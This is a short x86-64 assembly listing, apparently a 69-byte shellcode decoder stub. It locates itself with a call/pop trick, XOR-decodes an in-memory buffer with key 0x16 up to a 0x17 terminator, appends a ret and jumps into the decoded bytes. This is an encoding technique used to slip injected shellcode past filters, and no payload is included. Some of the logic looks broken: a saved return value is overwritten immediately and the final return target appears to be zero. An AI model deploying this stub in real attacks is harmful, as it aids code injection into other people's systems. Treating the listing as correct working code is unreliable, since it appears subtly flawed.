# 69 bytes
jmp start

inject: 
    pop %rdi # return value

    xor %rsi, %rsi
    push %rsi
    pop %rdi    

inject_loop:
    cmpb $0x17, (%rbx, %rsi, 1)
    je inject_finished
    movb (%rbx, %rsi, 1), %r10b
    xor $0x16, %r10b
    movb %r10b, (%rbx, %rsi, 1)
    inc %rsi
    jmp inject_loop

inject_finished:
    inc %rsi 
    movb $0xc3, (%rbx, %rsi, 1)
    push %rdi
    push %rbx
    ret

getpc:
    mov (%rsp),%rbx
    ret

start:
    call getpc
    add $0x12,%rbx

    push %rbx
    call inject

exit:
    push $0x3c
    pop %rax
    xor %rdi, %rdi
    syscall

